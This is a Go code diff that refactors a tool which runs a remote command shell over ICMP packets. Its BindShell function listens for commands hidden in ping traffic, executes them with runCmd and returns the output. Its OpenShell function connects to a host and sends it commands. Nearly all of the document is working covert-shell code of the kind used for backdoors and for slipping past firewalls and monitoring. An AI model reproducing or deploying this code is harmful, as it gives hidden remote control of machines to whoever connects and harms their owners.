@@ -1,13 +1,13 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
+	"io"
+	"io/ioutil"
 	"log"
-	"net"
 
 	"github.com/APTy/gibs/icmpcat"
-
-	"golang.org/x/net/ipv4"
 )
 
 type CLI struct {
@@ -17,7 +17,7 @@ type CLI struct {
 }
 
 func NewCLI() (*CLI, error) {
-	icmp, err := icmpcat.New()
+	icmp, err := icmpcat.NewV2()
 	if err != nil {
 		return nil, err
 	}
@@ -28,33 +28,48 @@ func NewCLI() (*CLI, error) {
 	}, nil
 }
 
-// Open a shell that executes remote requests
 func (cli *CLI) BindShell() {
-	log.Println("bind")
-	cli.icmp.OnReceive(func(peer *net.IPAddr, res []byte) {
-		msg := parseMsg(res)
-		if msg.kind == msgCmdType {
-			fmt.Println(msg.value)
-			msg := newMsgResType(runCmd(msg.value))
-			cli.icmp.Send(ipv4.ICMPTypeEchoReply, msg.bytes, peer.String())
+	cli.icmp.Accept()
+	cli.icmp.OnReceive(func(r io.Reader) {
+		res, err := ioutil.ReadAll(r)
+		if err != nil {
+			log.Printf("err: %v", err)
+			return
 		}
+		msg := parseMsg(res)
+		if msg.kind != msgCmdType {
+			return
+		}
+		fmt.Println(msg.value)
+		cmd := runCmd(msg.value)
+		response := newMsgResType(cmd)
+		cli.icmp.Send(bytes.NewBuffer(response.bytes))
 	})
 	cli.icmp.Listen()
 }
 
-// Execute a command on the remote host
-func (cli *CLI) SendCmd(cmd, host string) {
-	cli.icmp.OnReceive(func(peer *net.IPAddr, res []byte) {
-		msg := parseMsg(res)
-		if msg.kind == msgResType {
-			fmt.Printf("%s", msg.value)
-			cli.sema <- true
+func (cli *CLI) OpenShell(host string) {
+	cli.icmp.Connect(host)
+	cli.icmp.OnReceive(func(r io.Reader) {
+		res, err := ioutil.ReadAll(r)
+		if err != nil {
+			log.Printf("err: %v", err)
+			return
 		}
+		msg := parseMsg(res)
+		if msg.kind != msgResType {
+			return
+		}
+		fmt.Printf("%s", msg.value)
+		cli.sema <- true
+		log.Printf("done receiving")
 	})
 	cli.input.On(func(b []byte) {
 		cmd := newMsgCmdType(string(b))
-		cli.icmp.Send(ipv4.ICMPTypeEcho, cmd.bytes, host)
+		cli.icmp.Send(bytes.NewBuffer(cmd.bytes))
 		<-cli.sema
+		log.Printf("done inputting")
 	})
 	cli.icmp.Listen()
+
 }
